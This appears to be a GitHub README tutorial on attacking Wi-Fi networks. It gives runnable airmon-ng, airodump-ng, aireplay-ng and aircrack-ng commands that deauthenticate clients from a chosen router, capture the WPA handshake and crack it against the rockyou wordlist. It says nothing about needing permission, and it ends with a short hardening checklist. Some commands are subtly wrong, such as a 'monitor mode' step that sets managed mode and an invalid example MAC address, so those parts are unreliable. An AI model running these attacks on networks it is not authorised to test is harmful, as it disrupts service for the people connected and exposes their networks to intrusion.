# <div align="center"> Wireless Penetration Testing </div>


## Index
- [What is Wi-Fi Pentesting. Why is it So Important ?](https://github.com/Esther7171/WiFi-Pentesting/blob/main/README.md#what-is-wi-fi-pentesting-why-is-it-so-important-)
- [Requirements](https://github.com/Esther7171/WiFi-Pentesting/edit/main/README.md#requirements)
- [Recommended Products](https://github.com/Esther7171/WiFi-Pentesting/edit/main/README.md#recommended-products)
- [Install Wi-fi Drivers](https://github.com/Esther7171/WiFi-Pentesting/edit/main/README.md#recommended-products)
- [Basics]()
- Scan Local Area WiFi networks.
- Deauthenticate Attack
- Capture Handshake file.
- Crack handshake using aircrack.
- Crack handshake using John/Hashcat.
- WhiteListing Mac

# What is Wi-Fi Pentesting. Why is it So Important ?
Wireless penetration testing is a part of network penetration testing (NPT). This is a Security assessment process focused on Identifying vulnerabilities and reviewing general security tweaks in Network. Wireless pentesting is crucial for securing these networks against unauthorized access, data theft, and other cyber threats.

An attacker can easily spoof and view other users' data within the network, perform various attacks to disrupt it, and spread different types of malware, such as worms, to infect the entire network.

# Requirements
### Wireless Adapter, that supports:
* 2.4g,5g
* Monitor Mode
* Packet Injection
### Linux Operating System like:
* kali
* Parrot

# Recommended Products
### In my case im using TP-LINK Archer T2U Plus AC600 
<div align="center">
  <img src="https://github.com/Esther7171/web-development/assets/122229257/257d5af9-d9b3-40f3-b7fe-298c0fe03918" height="400"></div>
</div>

## Why should i buy this adapter ?
This adapter has a Realtek RTL8821AU Chipset. It will cost u ₹1,100 or maybe less. it have a good range and It support in linux community and has driver for Kali linux, Parrot OS ..etc Archer T2U Plus is on sale under 1000 INR, which is a very affordable price and it too good in my opinion for Beginners in Pentesting.
## Where to buy

👉[Amazon](https://www.amazon.in/TP-Link-Wireless-Adapter-Archer-T2U/dp/B07P681N66?th=1)

👉[Flipkart](https://www.flipkart.com/tp-link-ac600-t2u-plus-usb-adapter/p/itmfhz7zg85hgtzg?marketplace=FLIPKART&iid=79034678-e8a7-4d71-8d97-073f9497fcdc.USBFHZ7ZPWFHW8YW.SEARCH&ppt=sp&lid=LSTUSBFHZ7ZPWFHW8YW9SRRQK&srno=s_1_1&qH=2fca2860d6b488dc&pid=USBFHZ7ZPWFHW8YW&affid=amaledasse&ssid=7o14gihn8ag5p98g1609082867282&otracker1=search&ppn=sp)

👉[AC1300 T3U](https://www.amazon.in/TP-LINK-T3U-Wireless-MU-MIMO-Supports/dp/B0859M539M/ref=sr_1_1?adgrpid=1320515074786039&hvadid=82532451038389&hvbmt=be&hvdev=c&hvlocphy=158589&hvnetw=o&hvqmt=e&hvtargid=kwd-82533072486919%3Aloc-90&hydadcr=18064_2117722&keywords=t3u&qid=1701157393&sr=8-1&th=1)

## If you don’t have any budget concerns,you can go for this Alfa WiFi adapter, which costs around 4-10k depending on sales or market prices. They have more range
👉[AC1200](https://www.amazon.in/Alfa-AC1900-Wifi-adapter-Long-Range/dp/B01MZD7Z76)

👉[AC1900](https://www.amazon.in/Alfa-AC1900-Wifi-adapter-Long-Range/dp/B01MZD7Z76)

# Installation of WiFi Drivers
## Install One Shot
### Copy and past on your's Kali Terminal 🙂
```bash
git clone https://github.com/Esther7171/WiFi-Pentesting && cd WiFi-Pentesting && chmod +x install.sh && ./install.sh
```
* This Script will automaticall install Drivers kali as well External Wifi adapters.

# Basics

The First this is to do Recorganize your wireless adapater name according to your os
* In kali the Default name is ```wlan0```, If you have 2 wifi adapter connected at same time it will show ```wlan1```

# step 1. Monitor mode 
#### First you need adapter who's support Monitor mode && packet injection if u using this TP-link T2U plus. So ur ready

## give root permision so it more comfortable :
```bash
sudo sudo
su root
```
## Using iwconfig check wheather adapter is Managed  mode or Monitor mode. 

```bash
iwconfig
``` 
## hmm i know it on Managed mode
![Screenshot 2023-10-17 214221](https://github.com/Esther7171/web-development/assets/122229257/e86417f9-d99a-4b11-b222-876c1b25b9fb)



#  1. Kill all background process to do it (it dissconnect ur network so don't get panic) :
```bash
airmon-ng check kill
```
![Screenshot 2023-10-17 221157](https://github.com/Esther7171/web-development/assets/122229257/1865dd19-d01a-47b3-b7f9-74f6d9750af2)


* wlan0 => interface name .
* WIFI@REALTEK => Is wlan0 nickname u can use both but reccommended wlan0.
* if u have already connected to wifi sometime it show wlan1 or wlan2 rather than wlna0 (in case u have 2 adpater 1 for wifi and second to attack)
## 2. bring interface down to make it Monitor mode
```bash
ifconfig wlan0 down
``` 
## 3. to make it Monitormode
```bash
iwconfig wlan0 mode managed 
``` 
## 4. bring interface up again :
```bash
ifconfig wlan0 up
``` 
## 5. Now its on monitor mode check using :
```bash
iwconfig 
``` 
![Screenshot 2023-10-17 221254](https://github.com/Esther7171/web-development/assets/122229257/f754b3a2-9844-463b-8896-0b5ba3c05d3d)

# 2. Or not doing all this time wast u can do Directly this Monitor mode by using  😁 :
```bash
airmon-ng start wlan0   
``` 

# step 2. Check for nearby network
## to check use :
# it will show u all routers
```bash
airodump-ng wlan0   
```  

### ctrl + c =>  to stop 
![Screenshot 2023-10-17 221340](https://github.com/Esther7171/web-development/assets/122229257/dd887d5b-5665-46e8-9a21-8149062b33ca)


* Copy bssid ofnetwork u like (bssid = mac address show on first row)
*  also note the ch (channel number of same router)

# step 3. Check devices connect to that network and capture Handshake-file 

* --bssid => whom u going to attack
* --channel => to give channel number if it or use [(-c) for channel but sometime it didn't work well ]
* station => is the device connectedto router.
![Screenshot 2023-10-17 221650](https://github.com/Esther7171/web-development/assets/122229257/9bc23ec6-1f6a-4916-8ca4-52262d0e6699)

* --write => to creat a file where my handshake store
```bash
airodump-ng wlan0 --bssid --channel --write /path/Meow.txt
```
```bash
airodump-ng wlan0 --bssid -c -w /path/Meow.txt
```
## for an example
```bash
airodump-ng wlan0 --bssid 3C:46:45:1D:5D:31 --channel 11  -w /home/death/Meow.txt
```

![Screenshot 2023-10-17 221855](https://github.com/Esther7171/web-development/assets/122229257/e9ec3986-5e54-4bf3-9345-d90fc7057e33)


# step 4. kick off people form there network / deauthentication attack

* aireplay-ng is powerfull we using itfor deauth people and capture handshake when they try to reconnect.
* -a => router mac addrs.
* -c => device connected with router we going to deauthenticate.
* --deauth / -0 => to send number of deauth packeges.
```bash
aireplay-ng wlan0 -a -c  --deauth 10
```  
```bash
aireplay-ng wlan0 -a <bssid> -c <station>  -0 <number of packages>
```  
## for example 
```bash
aireplay-ng wlan0 -a 3C:46:45:1D:5D:31 -c D4:36:89:A4:7R:29 --deauth 10
```  
# To deauth on whole network use :
```bash
aireplay-ng wlan0 -a <bssid> -0 <deauth n.o packages>
```
## your handshake-file will be stored in the path u give 
- .cap  is the file fo capture handshake .  In my case is Meow.txt.cap
- so we going to crack it by aircrack-ng with wordlists.
# step 5. Crack the password / handshake file.
### To crack capture handshake we using aircrack-ng fast cracking tool
* -w to give wordlist.
* u got so many file but we need .cap file where handshake stored.
* if it not deauth another device.
* gzip -d /usr/share/wordlist/rockyou.txt (if it not)
![Screenshot 2023-10-17 225232](https://github.com/Esther7171/web-development/assets/122229257/c4fc707b-c3d0-46e4-a3b3-67bc1a041360)
 ```bash
aircrack-ng Meow.txt.cap -w /usr/share/rockyou.txt
```

![Screenshot 2023-10-17 225248](https://github.com/Esther7171/web-development/assets/122229257/760fda9a-b63c-4b78-a45d-b087561de64a)
* when it will crack it shou the password.




## Implementing general security tweaks 
* #### Encryption Standards: Ensure that WPA2/WPA3 is used instead of older protocols like WEP or WPA, which are less secure.
* #### SSID Management: Disable SSID broadcasting to make the network less visible. Use a non-identifiable SSID to avoid revealing the network type.
* #### Strong Passwords: Implement complex passwords for network access and change them regularly.
* #### MAC Address Filtering: Allow only authorized devices to connect by maintaining a whitelist of MAC addresses.
* #### Network Segmentation: Separate guest and internal networks to limit exposure and potential attack vectors.
* #### Disable WPS: Wi-Fi Protected Setup (WPS) can be vulnerable; disabling it can enhance security.
* #### Monitor for Rogue Access Points: Use tools to detect unauthorized access points that may compromise the network.
* #### Regular Firmware Updates: Keep access point firmware up to date to protect against known vulnerabilities.
* #### Intrusion Detection Systems (IDS): Deploy IDS to monitor and alert on suspicious activity.
* #### Conduct Regular Audits: Periodically review the security configurations and access logs to identify potential weaknesses.
